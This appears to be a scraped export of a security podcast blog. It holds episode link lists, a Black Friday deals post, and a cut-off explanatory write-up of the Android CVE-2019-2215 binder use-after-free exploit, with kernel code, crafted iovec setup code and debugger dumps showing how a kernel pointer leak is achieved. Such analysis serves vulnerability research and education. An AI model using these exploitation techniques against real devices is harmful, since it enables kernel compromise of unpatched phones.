href='https://arxiv.org/abs/1911.11746v1'>Defending Against Adversarial Machine Learning</a></li><br />\n<li>[01:34:21] <a href='https://arxiv.org/abs/1911.11946v1'>Can Attention Masks Improve Adversarial Robustness?</a></li><br />\n<li>[01:38:58] <a href='https://github.com/ondrejbudai/hidviz/'>Hidviz</a></li><br />\n<li>[01:41:05] <a href='https://out7.hex-rays.com/demo/request'>IDA 7 Demo Release</a></li><br />\n<li>[01:47:54] <a href='https://devblogs.microsoft.com/commandline/windows-terminal-preview-v0-7-release/'>Windows Terminal (Preview) 0.7 Release</a></li><br />\n</ul><!--kg-card-end: html-->","slug":"episode-20-cwe-top-25-hacking-anti-viruses-and-adversarial-machine-learning-attacks"}},{"node":{"title":"Episode 19 - What Does The NSA Say?","path":"/posts/episode-19-what-does-the-nsa-say/","date":"27 November 2019","description":"In this episode we discuss a recent NSA advisory regarding best practices for intercepting TLS traffic.  We also take a look at a recent DOM Clobbering (XSS) finding, several VNC exploits, and end with a discussion on fuzzer performance and hardening against power-analysis side channels.","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/XXhWwtRJNeE?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><hr><!--kg-card-begin: html--><p>You can watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<p>Our past episodes are available on the following platforms</p>\n<ul>\n    <li><a href=\"https://youtube.com/c/dayzerosec\">Youtube (@DAY[0])</a></li>\n    <li><a href=\"https://open.spotify.com/show/4NKCxk8aPEuEFuHsEQ9Tdt\">Spotify</a></li>\n    <li><a href=\"https://podcasts.apple.com/us/podcast/day-0-zero-days-for-day-zero/id1484046063?uo=4\">Apple Podcasts</a></li>\n    <li><a href=\"https://www.google.com/podcasts?feed=aHR0cHM6Ly9hbmNob3IuZm0vcy9hMTIxYTI0L3BvZGNhc3QvcnNz\">Google Podcasts</a></li>\n    <li>For a full list of platforms visit <a href=\"https://anchor.fm/dayzerosec\">Anchor</a></li>\n</ul><!--kg-card-end: html--><hr><!--kg-card-begin: html-->\n<ul>\n<li>[00:00:35] <a href='https://pagedout.institute/'>PagedOut #2 </a></li><br />\n<li>[00:07:38] <a href='/posts/black-friday-for-security-professionals/'>Black Friday Deals to watch out for</a></li><br />\n<li>[00:17:59] <a href='https://www.getmonero.org/2019/11/19/warning-compromised-binaries.html'>Official Monero website is hacked to deliver currency-stealing malware</a></li><br />\n<li>[00:26:30] <a href='https://media.defense.gov/2019/Nov/18/2002212783/-1/-1/0/MANAGING%20RISK%20FROM%20TLS%20INSPECTION_20191106.pdf'>Managing Risk from Transport Lay Security Inspection</a></li><br />\n<li>[00:40:55] <a href='https://www.zdnet.com/article/us-student-was-allegedly-building-a-custom-gentoo-linux-distro-for-isis/'>US student was allegedly building a custom Gentoo Linux distro for ISIS</a></li><br />\n<li>[00:48:41] <a href='https://arstechnica.com/gadgets/2019/11/google-outlines-plans-for-mainline-linux-kernel-support-in-android/'>Google Outlines Plans for Mainline Linux Kernel Support in Android</a></li><br />\n<li>[00:55:12] <a href='https://blog.cloudflare.com/introducing-flan-scan/'>Introducing Flan Scan</a></li><br />\n<li>[00:59:44] <a href='https://security.googleblog.com/2019/11/expanding-android-security-rewards.html'>Expanding Android Security Rewards</a></li><br />\n<li>[01:05:26] <a href='https://blog.mozilla.org/security/2019/11/19/updates-to-the-mozilla-web-security-bounty-program/'>Updates to the Mozilla Web Security Bounty Program</a></li><br />\n<li>[01:07:59] <a href='https://research.securitum.com/xss-in-amp4email-dom-clobbering/'>XSS in GMailâ€™s AMP4Email via DOM Clobbering</a></li><br />\n<li>[01:17:32] <a href='https://ics-cert.kaspersky.com/reports/2019/11/22/vnc-vulnerability-research/'>VNC Vulnerabilities (LibVNC, TightVNC, TurboVNC and UltraVNC)</a></li><br />\n<li>[01:26:22] <a href='https://seclists.org/fulldisclosure/2019/Nov/21'>Arbitrary file capture in Kaspersky Total Security 2019</a></li><br />\n<li>[01:30:43] <a href='https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html'>Bad binder: Android In-The-Wild Exploit</a></li><br />\n<li>[01:36:03] <a href='https://arxiv.org/pdf/1911.07707.pdf'>Building Fast Fuzzers</a></li><br />\n<ul><li><a href='https://github.com/gamozolabs/fzero_fuzzer'>https://github.com/gamozolabs/fzero_fuzzer</a></li></ul><br />\n<li>[01:49:47] <a href='https://arxiv.org/abs/1911.09586v1'>The Performance of Machine and Deep Learning Classifiers in Detecting Zero-Day Vulnerabilities</a></li><br />\n<li>[02:02:08] <a href='https://arxiv.org/abs/1911.08813v1'>PARAM: A Microprocessor Hardened for Power Side-Channel Attack Resistance</a></li><br />\n</ul><!--kg-card-end: html-->","slug":"episode-19-what-does-the-nsa-say"}},{"node":{"title":"Black Friday for Security Professionals","path":"/posts/black-friday-for-security-professionals/","date":"25 November 2019","description":"Plenty of websites are offering deals for Black Friday, these are the places we plan to check out.","content":"<!--kg-card-begin: markdown--><p><a href=\"https://www.pluralsight.com/\">PluralSight</a></p>\n<p><strong>The Deal</strong> - Annual subscription at 40% off ($179 for standard, $269 for premium)</p>\n<p><strong>zi</strong> - PluralSight is an online learning platform providing courses about software development, system administration, and general technology. My primary use for it has been while working as a consultant, while I've got plenty of security background, I don't always know the intimate details about a particular technology stack. I would turn to Pluralsight to get up-to-speed on a particular topic before an engagement on a new tech stack. The information certainly is available through some Google searches, the conviennce of having everything readily available and there being some baseline standards upheld by PluralSight's instructors did make it a handy tool. I wouldn't consider it a worthwhile investment if you're looking to learn about security, they are lacking in quality security courses, and those that exist are not really worth it in my opinion.</p>\n<p><strong>Specter</strong> - A lot of PluralSight's security content is focused on web app hacking or network security. While there are a few courses that focus on binary, they're few and far between, and I wouldn't say the subscription is worth it for that alone. Even at the 40% off discount, I'd recommend using the trial to make sure there's enough courses you find interesting before committing to a subscription.</p>\n<hr>\n<p><a href=\"https://www.oreilly.com/online-learning/cybermonday-2019.html\">O'Reilly Online Learning</a></p>\n<p><strong>The Deal</strong> - Annual subscription to the Online Learning program at 50% off ($199)</p>\n<p><strong>zi</strong> - As the name implies, this is an online learning platform, unlike PluralSight, this includes access to books from O'Reilly and other publishers such as No Starch Press and Wiley, two of my favorite tech publishers. One of the most interesting features is the sandbox envrionments they provide (Kubernetes, Python, Tensorflow, and Ubuntu), basically cloud-based VMs running the respective tools that you can access on-demand. They also provide practice tasks and interactive walkthroughs of some basics tasks. While the existing tutorials are quite fundamental, its an interesting setup (using Katacode) that would probably quite useful if you were learning any of the topics covered. For most I think the biggest value comes from the library access and video course access. At roughly $25 a month, its not cheap, but they offer a singificant number of <em>good</em> books, both in general and security related. Basically every book I tend to recommend is on there so its a good library.</p>\n<hr>\n<p><a href=\"https://nostarch.com\">No Starch Press</a></p>\n<p><strong>The Deal</strong> - Last year the deal was 42% off their books, this year hasn't been announced yet, just that they are planning something.</p>\n<p><strong>zi</strong> - No Starch is one of my favorite technology and security book publishers. Many of their books are excellent in quality and enjoyable read. You've probably heard of some of their books such as the XYZ Hacker's Handbook series and the Black Hat and Gray hat {language} series among many other non-series books. If they run another steep discount I'll likely be picking up physical copies of Black Hat Go and Serious Cryptography and I'd recommend taking a look at their library, and maybe asking in our Discord for some book recommendations, they have some great content.</p>\n<hr>\n<p><a href=\"https://pastebin.com/pro\">Pastebin Pro</a></p>\n<p><strong>The Deal</strong> - In past years the deal was $20 for the Lifetime Pro Membership. No indication if it will be the same this year.</p>\n<p><strong>zi</strong> - If you use pastebin, its a pretty good deal. If you don't use pastebin, well, you probably won't benefit from this. Pastebin is basically just a simple website to paste text and share it temporarily. The fact its so simple to use and no authentication necessary has lead pastebin being used to exfiltrate or dump data from compromises leading to a secondary feature of pastebin: keyword monitoring. With a Pro account you get access to alerts on certain key words appearing in a paste and the ability to use their API to scrape data. The last feature of Pro is unlimited unlisted and private pastes that don't show up publically. I know many people in the security industry do use pastebin for quick throw away things so I figured it was worth mentioning here.</p>\n<p><strong>Specter</strong> - The unlimited unlisted and private pastes, the API access, and the larger file limit (10MB as opposed to 500KB) is well worth a lifetime subscription if it's available, however it's not the end of the world if you miss this deal. As zi said, if you're a Pastebin fan, this is probably worth the buy. It's worth noting that there are other paste sites that offer some of what Pastebin pro offers and more for free if you're using Pastebin for it's quick code sharing functionality rather than scraping it.</p>\n<hr>\n<p><a href=\"https://pentesterlab.com/pro\">PentesterLab Pro</a></p>\n<p><strong>The Deal</strong> - 13.37% off annual subscriptions.</p>\n<p><strong>zi</strong> - PentesterLab is another learning platform, this time with a security focus (web application security) and very-much hands on. With a Pro account you get access to a number of web-security 'courses' which are generally short and focused on a single, specific exploit, or attack technique. You are provided with a live, vulnerable envrionment to practice within, as with many things you could go and setup your own VM and attack it yourself, but having one ready for you saves you a ton of time and hassle. I have not used PentesterLab myself so I cnanot comment on the quality of instruction.</p>\n<hr>\n<p><a href=\"https://protonmail.com/blog/black-friday-2019/\">ProtonMail</a></p>\n<p><strong>The Deal</strong> - 33-50% off ProtonMail and ProtonVPN.</p>\n<p><strong>zi</strong> - This is another product I've not used, but I know would be of interest to people who care about security. ProtonMail offers End-To-End encrypted email between ProtonMail customers. You can read more about their security features on their website.</p>\n<hr>\n<p><a href=\"https://store.vmware.com/store?Action=html&amp;Locale=en_US&amp;SiteID=vmware&amp;pbPage=BlackFridaySale\">VMWare Workstation Pro and Fusion pro</a></p>\n<p><strong>The Deal</strong> - 35% off Fusion Pro and Workstation Pro, 30% off the non-pro versions.</p>\n<p><strong>zi</strong> - Running Vms is a constant part of life in the security industry. Maybe I'm running a VM just to have access to some Linux tooling from Windows, or to run some services I'm assessing away from my actual desktop. Whatever the case, VMWare is widely considered the best Desktop VM platform, but its also the most expensive. If you're finding yourself not too happy with Hyper-V, Virtual Box or whatever you use, now would be a good time to atleast checkout VMWare's offering.</p>\n<p><strong>Specter</strong> - VMWare is a daily driver of mine, so unsurprisingly this is another deal that I recommend people interested in security take, especially if you're planning on doing research into kernel development / exploitation, and/or malware research. Between VirtualBox, HyperV, and VMWare, I've found VMWare to be the most performant. The pro editions also allow you to use snapshots which are valuable to quickly get back to work when working on things that could end up crashing the kernel a lot (such as driver development or exploits).</p>\n<hr>\n<p><a href=\"https://shop.hak5.org/\">Hak5</a></p>\n<p><strong>The Deal</strong> - Various discounts on the Hak5 store.</p>\n<p><strong>zi</strong> - If you have a need for their products now is a good time to buy or upgrade to a newer model, if you don't have a need I'd recommend skipping. Hak5 is fairly well known for the Pineapple and for their numerous hacking tools, everything is always pretty decent quality and often has some quality of life improvements over whatever you might make yourself with off-the-shell components. The thing is, for a lot of people they see these things and think about how 'cool' they are or how much of a 'hacker' they'd be if they had it without actually considering any practical usecase. Meaning many purchases just become novelty items collecting dusts on a shelf after a few months. If you have an immediate and known use for them, go ahead and pick something up, but don't waste your money if you don't yet know how you'd use the tools. Its very much for professionals in the sense that the average peope just isn't going to be in a situation to be dropping a rogue AP into a corporate network but a professional might.</p>\n<hr>\n<p><a href=\"https://www.namecheap.com/blog/vault-will-open-black-friday-cyber-monday/\">NameCheap</a></p>\n<p><strong>The Deal</strong> - Various hosting and domain related deals</p>\n<p><strong>zi</strong> - If you want a vanity domain, there are usually good discounts going on and some cheap hosting. Not sure about the quality of hosting through NameCheap, but I've registered a few domains with them without any issues.</p>\n<hr>\n<p><a href=\"https://lowendbox.com\">LowEndBox</a></p>\n<p><strong>The Deal</strong> - Various deals from hosting providers</p>\n<p><strong>zi</strong> - I like to pick up a cheap server ever now and again just to run little scripts, or apps away from my main servers. I wouldn't trust these deals for anything meant for production, but having a server to run some long running scripts/bots/scanners on is nice, and LowEndBox will usually list some very good deals. One of my better deals was a VPS at $60 for 3 years that I've been running a service that is publically used on for nearly 6 years now. Now is also a good time to check with your favorite host to find deals.</p>\n<!--kg-card-end: markdown-->","slug":"black-friday-for-security-professionals"}},{"node":{"title":"Analyzing Android's CVE-2019-2215 (/dev/binder UAF)","path":"/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/","date":"8 November 2019","description":"Over the past few weeks, those of you who frequent the DAY[0] streams over on\nour Twitch may have seen me working on trying to understand the recent Android\nBinder Use-After-Free (UAF) published by Google's Project Zero (p0). This bug is\nactually not new, the issue was discovered and fixed in the mainline kernel in\nFebruary 2018, however, p0 discovered many popular devices did not receive the\npatch downstream. Some of these devices include the Pixel 2, the Huawei P20, and\nSamsung Galaxy S7, S8, ","content":"<p>Over the past few weeks, those of you who frequent the DAY[0] streams over on our Twitch may have seen me working on trying to understand the recent Android Binder Use-After-Free (UAF) published by Google's Project Zero (p0). This bug is actually not new, the issue was discovered and fixed in the mainline kernel in February 2018, however, p0 discovered many popular devices did not receive the patch downstream. Some of these devices include the Pixel 2, the Huawei P20, and Samsung Galaxy S7, S8, and S9 phones. I believe many of these devices received security patches within the last couple weeks that finally killed the bug.</p><p>After a few streams of poking around with a kernel debugger on a virtual machine (running Android-x86), and testing with a vulnerable Pixel 2, I've came to understand the exploit written by Jann Horn and Maddie Stone pretty well. Without an understanding of Binder (the <code>binder_thread</code> object specifically), as well as how Vectored I/O works, the exploit can be pretty confusing. It's also quite clever how they exploited this issue, so I thought it would be cool to write up how the exploit works.</p><p>We'll mostly be focusing on how an arbitrary read/write primitive is established, we won't focus on the post-exploit stuff such as disabling SELinux and enabling full root capabilities as there are quite a few write-ups out there already that cover that. Here's a brief overview of what this article will cover:</p><ol><li>Basic overview of Binder and Vectored I/O</li><li>Vulnerability details</li><li>Leaking the kernel task struct</li><li>Establishing an arbitrary read/write (arbitrary r/w) primitive</li><li>Conclusion</li></ol><p>Note that all code snippets will be from kernel v4.4.177, as this is the kernel I tested on personally.</p><h2 id=\"basic-overview-of-binder-and-vectored-i-o\">Basic overview of Binder and Vectored I/O</h2><h4 id=\"binder\">Binder</h4><p>The Binder driver is an Android-only driver which provides an easy method of Inter Process Communication (IPC), including Remote Procedure Calling (RPC). You will find this driver's source code in the mainline Linux kernel, however it is not configured for non-Android builds.</p><p>There are a few different binder device drivers that are used for different types of IPC. For communication between framework and app processes using the Android Interface Definition Language (AIDL), <code>/dev/binder</code> is used. For communication between framework and vendor processes / hardware using the Hardware Abstraction Layer (HAL) Interface Definition Language (HIDL), <code>/dev/hwbinder</code> is used. Finally, for vendors who want to use IPC between vendor processes without using HIDL, <code>/dev/vndbinder</code> is used. For the purposes of the exploit, we only care about the first driver, <code>/dev/binder</code>.</p><p>Like most IPC mechanisms in Linux, binder works through file descriptors, and you can add event polls to it using the EPOLL API.</p><h3 id=\"vectored-i-o\">Vectored I/O</h3><p>Vectored I/O allows you to either write into a data stream using multiple buffers, or read from a data stream into multiple buffers. It's also known as \"scatter/gather I/O\". Vectored I/O offers a few advantages over non-vectored I/O. For one, you can write with or read to different buffers that are non-contiguous without a bunch of overhead. It's also atomic.</p><p>An example of where vectored I/O is useful is a data packet where you have a header followed by data in a contiguous block. Using vectored I/O, you can keep the header and the data in separate, non-contiguous buffers, and read to them or write using them with one system call instead of two.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://i.imgur.com/IFDZCdA.png\" class=\"kg-image\" alt=\"vectored IO diagram\"></figure><p>How this works is you'll define an array of <code>iovec</code> structures which contain information about all the buffers you'd like to use for I/O. The <code>iovec</code> structure is relatively small, consisting only of two QWORDS (8 byte data) on 64-bit systems.</p><pre><code class=\"language-c\">struct iovec { \t\t// Size: 0x10\n    void *iov_base;\t// 0x00\n    size_t iov_len; // 0x08\n}\n</code></pre><h2 id=\"vulnerability-details\">Vulnerability details</h2><p>The Binder driver has a cleanup routine you can trigger from <code>ioctl()</code> before actually closing the driver. If you're familiar with drivers and cleanup routines, you can likely already guess why this is can cause issues.</p><p>Let's look at the p0 report summary.</p><!--kg-card-begin: markdown--><blockquote>\n<p>As described in the upstream commit:</p>\n<p>â€œbinder_poll() passes the thread-&gt;wait waitqueue that<br>\ncan be slept on for work. When a thread that uses<br>\nepoll explicitly exits using BINDER_THREAD_EXIT,<br>\nthe waitqueue is freed, but it is never removed<br>\nfrom the corresponding epoll data structure. When<br>\nthe process subsequently exits, the epoll cleanup<br>\ncode tries to access the waitlist, which results in<br>\na use-after-free.</p>\n</blockquote>\n<!--kg-card-end: markdown--><p>This summary is a bit misleading. The use-after-free is not on the waitqueue itself. The waitqueue is an inline struct in the <code>binder_thread</code> structure, the <code>binder_thread</code> object is what's actually UAF'd. The reason they mention the waitqueue directly in this commit summary is this issue was originally found by Google's Syzkaller fuzzer back in 2017, and the fuzzer triggered a use-after-free detected by the Kernel Address Sanitizer (KASAN) on the waitqueue's mutex.</p><h3 id=\"the-free\">The free</h3><p>Let's take a look at the ioctl command in question, <code>BINDER_THREAD_EXIT</code>.</p><pre><code class=\"language-c\">static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\t// [...]\n    \n    switch (cmd) {\n\t// [...]\n\tcase BINDER_THREAD_EXIT:\n\t\tbinder_debug(BINDER_DEBUG_THREADS, \"%d:%d exit\\n\",\n\t\t\t     proc-&gt;pid, thread-&gt;pid);\n\t\tbinder_free_thread(proc, thread);\n\t\tthread = NULL;\n\t\tbreak;\n     // [...]\n    }\n}\n\n// [...]\n\nstatic int binder_free_thread(struct binder_proc *proc,\n\t\t\t      struct binder_thread *thread)\n{\n\tstruct binder_transaction *t;\n\tstruct binder_transaction *send_reply = NULL;\n\tint active_transactions = 0;\n\n\t// [...]\n    \n\twhile (t) {\n\t\tactive_transactions++;\n\t\t// [...]\n\t}\n\tif (send_reply)\n\t\tbinder_send_failed_reply(send_reply, BR_DEAD_REPLY);\n\tbinder_release_work(&amp;thread-&gt;todo);\n\tkfree(thread);\n\tbinder_stats_deleted(BINDER_STAT_THREAD);\n\treturn active_transactions;\n}\n</code></pre><p>The critical line of code here is line 2610, <code>kfree(thread)</code>. This is where the \"free\" part of the use-after-free happens.</p><h3 id=\"the-use-after-free-\">The use (after free)</h3><p>Now that we've seen where the free happens, let's try to see where the use happens. The stack trace from the KASAN report will be helpful for this.</p><pre><code class=\"language-text\">Call Trace:\n  ...\n  _raw_spin_lock_irqsave+0x96/0xc0 kernel/locking/spinlock.c:159\n  remove_wait_queue+0x81/0x350 kernel/sched/wait.c:50\n  ep_remove_wait_queue fs/eventpoll.c:595 [inline]\n  ep_unregister_pollwait.isra.7+0x18c/0x590 fs/eventpoll.c:613\n  ep_free+0x13f/0x320 fs/eventpoll.c:830\n  ep_eventpoll_release+0x44/0x60 fs/eventpoll.c:862\n  ...\n</code></pre><p>At first, it can be a bit confusing because the <code>binder_thread</code> object is referenced indirectly, ie. if you ctrl + f for <code>binder_thread</code> you won't find any occurrences. However, if we quickly look at <code>ep_unregister_pollwait()</code>:</p><pre><code class=\"language-c\">static void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)\n{\n\tstruct list_head *lsthead = &amp;epi-&gt;pwqlist;\n\tstruct eppoll_entry *pwq;\n\n\twhile (!list_empty(lsthead)) {\n\t\tpwq = list_first_entry(lsthead, struct eppoll_entry, llink);\n\n\t\tlist_del(&amp;pwq-&gt;llink);\n\t\tep_remove_wait_queue(pwq);\n\t\tkmem_cache_free(pwq_cache, pwq);\n\t}\n}\n</code></pre><p>We'll notice our free'd <code>binder_thread</code> is in <code>epoll_entry</code>'s linked list, and eventually will be what <code>pwq</code> is.</p><pre><code class=\"language-c\">static void ep_remove_wait_queue(struct eppoll_entry *pwq)\n{\n\twait_queue_head_t *whead;\n\n\trcu_read_lock();\n\t/*\n\t * If it is cleared by POLLFREE, it should be rcu-safe.\n\t * If we read NULL we need a barrier paired with\n\t * smp_store_release() in ep_poll_callback(), otherwise\n\t * we rely on whead-&gt;lock.\n\t */\n\twhead = smp_load_acquire(&amp;pwq-&gt;whead);\n\tif (whead)\n\t\tremove_wait_queue(whead, &amp;pwq-&gt;wait);\n\trcu_read_unlock();\n}\n</code></pre><p>We can see that <code>pwq</code> is used in two places. One is the head of the linked list for the wait queues, <code>whead</code>. The other is the wait queue object itself being deleted via <code>remove_wait_queue</code>.</p><p>At first glance it seems both arguments to <code>remove_wait_queue</code> should be relatively close in memory, but the <code>smp_load_acquire()</code> macro needs to be considered. This macro is a memory barrier. Initially I assumed this macro just added some compiler stuff for atomic access to <code>whead</code>, but this was a mistake. What's not entirely obvious is <code>smp_load_acquire()</code> macro dereferences what's passed to it. So what I originally read as <code>whead = &amp;pwq-&gt;whead</code> is actually more like <code>whead = *(wait_queue_head_t *)&amp;pwq-&gt;whead</code>, or more simply, <code>whead = pwq-&gt;whead</code>.</p><p>Let's look at <code>remove_wait_queue()</code>.</p><pre><code class=\"language-c\">// WRITE-UP COMMENT: q points into stale data / the UAF object\nvoid remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)\n{\n\tunsigned long flags;\n\n\tspin_lock_irqsave(&amp;q-&gt;lock, flags);\n\t__remove_wait_queue(q, wait);\n\tspin_unlock_irqrestore(&amp;q-&gt;lock, flags);\n}\n</code></pre><p>When the head of the linked list ends up being our UAF'd <code>binder_thread</code>, <code>q</code> points to stale data. This is why a KASAN crash occurs on the spinlock - it will attempt to lock the mutex on <code>q</code>, which is free'd memory.</p><p>On normal devices not using KASAN instrumentation, if you run the Proof-of-Concept (PoC) as-is you likely won't notice anything. It's highly likely that no crash will occur, which may lead you to (incorrectly) assume the device is not vulnerable. This is because it is very likely <code>q</code> still points to valid, stale heap data. However, if you perform a heap spray of <code>0x41</code>'s, you will trigger a CPU stall, which will cause your device to freeze.</p><p>This is because a lock is essentially just an integer that's set to either 0 (for unlocked) or 1 (for locked). Technically, if the mutex is set to any value that's not zero, it's considered locked. Because an attacker-controlled heap spray will essentially lock the mutex without going through proper channels, this mutex will be permanently locked, which will cause a deadlock and freeze the device.</p><p>It's worth noting this object resides in the <code>kmalloc-512</code> cache, which is a pretty decent cache for exploitation because it's not used a lot by background processes compared to smaller caches. On kernel v4.4.177, the object is <code>0x190</code> or 400 bytes in size. Because of this size being so far from both <code>kmalloc-256</code> and <code>kmalloc-512</code> - it's a fair assumption that this object ends up in the <code>kmalloc-512</code> cache on most if not all devices.</p><h2 id=\"leaking-the-kernel-task-struct\">Leaking the kernel task struct</h2><h3 id=\"weaponizing-an-unlink\">Weaponizing an unlink</h3><p>The way this vulnerability was exploited was quite clever. The exploit takes advantage of a linked list unlink operation. This can be used on an overlapped object to corrupt it using the linked list meta-data.</p><p>Assuming the spinlock doesn't deadlock on an invalid mutex due to memory corruption, eventually the next <code>ep_remove_wait_queue()</code>'s <code>&amp;pwq-&gt;wait</code> reference will point into our UAF'd object. Consider what <code>remove_wait_queue()</code>, and inevitably, <code>__remove_wait_queue()</code>, does on this structure:</p><pre><code class=\"language-c\">// WRITEUP COMMENT: old points to stale data / the UAF object\nstatic inline void\n__remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)\n{\n\tlist_del(&amp;old-&gt;task_list);\n}\n// ...\nstatic inline void list_del(struct list_head *entry)\n{\n\t__list_del(entry-&gt;prev, entry-&gt;next);\n\tentry-&gt;next = LIST_POISON1;\n\tentry-&gt;prev = LIST_POISON2;\n}\n// ...\nstatic inline void __list_del(struct list_head * prev, struct list_head * next)\n{\n\tnext-&gt;prev = prev;\n\tWRITE_ONCE(prev-&gt;next, next);\n}\n</code></pre><p>The main line of importance here is <code>next-&gt;prev = prev</code>, This essentially is an unlink, and writes into our UAF'd object a pointer of the previous object.</p><p>This is useful because if we overlap another kernel object on top of our UAF'd object, we can weaponize this unlink to corrupt data in the overlapped object. This is used by p0 to leak kernel data. Which object is a good candidate for this attack strategy? Enter <code>iovec</code>.</p><p>There are a few properties of the<code>iovec</code> structure that makes it a really good candidate for exploitation here.</p><ol><li>They're small (0x10 in size on 64-bit machines) and you can control all the fields with very few restrictions</li><li>You can stack them and thus control which kmalloc cache your <code>iovec</code> stack ends up in by how many you write with</li><li>They have a pointer (<code>iov_base</code>) which will be a perfect field to corrupt with the unlink.</li></ol><p>Under normal circumstances, <code>iov_base</code> is checked in the kernel anywhere it's used. The kernel will first ensure that <code>iov_base</code> is a userland pointer before processing the request, however using the unlink primitive we just talked about, we can corrupt this pointer post-validation and overwrite it with a kernel pointer, being the <code>prev</code> object in the unlink process.</p><p>This means when we read from a descriptor that was written to with the corrupted <code>iovec</code>, we'll be reading data originating from a kernel pointer, <em>not</em> a userland one like it's intended. This will allow us to leak kernel data relative to the <code>prev</code> pointer, which contains pointers useful enough to allow for arbitrary read/write as well as code execution.</p><p>The tricky step of this process is figuring out which <code>iovec</code>'s index lines up with the waitqueue. This is important because if we don't fake the mutex properly, the device will hang and we won't be able to have any fun on it.</p><p>Finding the offset of the waitqueue is fairly easy if you have a kernel image of the version you're targeting. By looking at a function that uses the waitqueue field of <code>binder_thread</code>, we can easily find the offset in the disassembly. One such function is <code>binder_wakeup_thread_ilocked()</code>. It calls <code>wake_up_interruptible_sync(&amp;thread-&gt;wait)</code>. The offset should be referenced when the address is loaded into the X0 register just before the call.</p><pre><code class=\"language-assembly\">.text:0000000000C0E2B4    ADD    X0, X8, #0xA0\n.text:0000000000C0E2B8    MOV    W1, #1\n.text:0000000000C0E2BC    MOV    W2, #1\n.text:0000000000C0E2C0    TBZ    W19, #0, loc_C0E2CC\n.text:0000000000C0E2C4    BL     __wake_up_sync\n</code></pre><p>On kernel v4.4.177, we can see the wait queue is <code>0xA0</code> bytes into the <code>binder_thread</code> object. Since <code>iovec</code> is 0x10 in size, this means the <code>iovec</code> at index <code>0xA</code> in the array will line up with the wait queue.</p><pre><code class=\"language-c\">#define BINDER_THREAD_SZ 0x190\n#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)\n#define WAITQUEUE_OFFSET 0xA0\n#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)\n</code></pre><p>So how does one pass a valid <code>iov_base</code> address which will pass validation while also keeping the lock at 0 to prevent a deadlock? Since the lock is only a DWORD (4 bytes), and a 64-bit pointer can be passed, you just need to use <code>mmap()</code> to map a userland address where the lower 32-bits are 0.</p><pre><code class=\"language-c\">dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n// ...\n\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nmemset(iovec_array, 0, sizeof(iovec_array));\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq-&gt;task_list-&gt;next */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq-&gt;task_list-&gt;prev */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;\n</code></pre><p>When the exploit runs, the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> will take the place of the mutex, as well as the <code>next</code> pointer in the linked list. The <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> will take the place of the <code>prev</code> pointer in the linked list. This means <code>IOVEC_INDX_FOR_WQ + 1</code>'s <code>iov_base</code> field is the one that will be overwritten with a kernel pointer.</p><p>Let's take a look at the free'd memory in KGDB on a VM running Android-x86 before and after the unlink operation. To do this, I set a breakpoint on the call to <code>remove_wait_queue()</code>. The first argument will point to the free'd memory, so we'll find the pointer in the RDI register. If we examine this memory before the call, we'll see the following:</p><pre><code class=\"language-text\">Thread 1 hit Breakpoint 11, 0xffffffff812811c2 in ep_unregister_pollwait.isra ()\ngdb-peda$ x/50wx $rdi\n0xffff8880959d68a0:     0x00000000      0x00000001      0x00001000      0x00000000\n0xffff8880959d68b0:     0xdeadbeef      0x00000000      0x00001000      0x00000000\n...\n</code></pre><p>Notice the data overlaps with some <code>iovec</code> structures from above - for example we can see 0xdeadbeef at <code>0xffff88809239a6b0</code>. Now let's take a look at the same memory after the the unlink occurs. We'll set a breakpoint at the end of <code>ep_unregister_pollwait</code> and examine the same memory.</p><pre><code class=\"language-text\">Thread 1 hit Breakpoint 12, 0xffffffff812811ee in ep_unregister_pollwait.isra ()\ngdb-peda$ x/50wx 0xffff8880959d68a0\n0xffff8880959d68a0:     0x00000000      0x00000001      0x959d68a8      0xffff8880\n0xffff8880959d68b0:     0x959d68a8      0xffff8880      0x00001000      0x00000000\n...\n</code></pre><p>The <code>iov_len</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> was overwritten with a kernel pointer, and the <code>iov_base</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> was overwritten with the same kernel pointer - thus corrupting the <code>iovec</code>'s internal backing structure in the kernel heap!</p><h3 id=\"triggering-the-leak\">Triggering the leak</h3><p>It seems p0 decided to go with a pipe as the medium for the leak. The attack strategy is basically as follows:</p><ol><li>Create a pipe</li><li>Trigger the free() on the <code>binder_thread</code> object so that the <code>iovec</code> structures allocated in the next step overlap it</li><li>Write the <code>iovec</code> structures into <code>binder_thread</code>'s old memory via the <code>writev()</code> system call on the pipe</li><li>Trigger the use-after-free / unlink to corrupt the <code>iovec</code> structure</li><li>Call <code>read()</code> on the pipe, which will use the uncorrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> to read the <code>dummy_page</code> data.</li><li>Call <code>read()</code> on the pipe again, which will use the corrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> to read kernel data into the leak buffer.</li></ol><p>Because we initialized two <code>iovec</code>'s with an <code>iov_len</code> of 0x1000, ultimately the <code>writev()</code> call 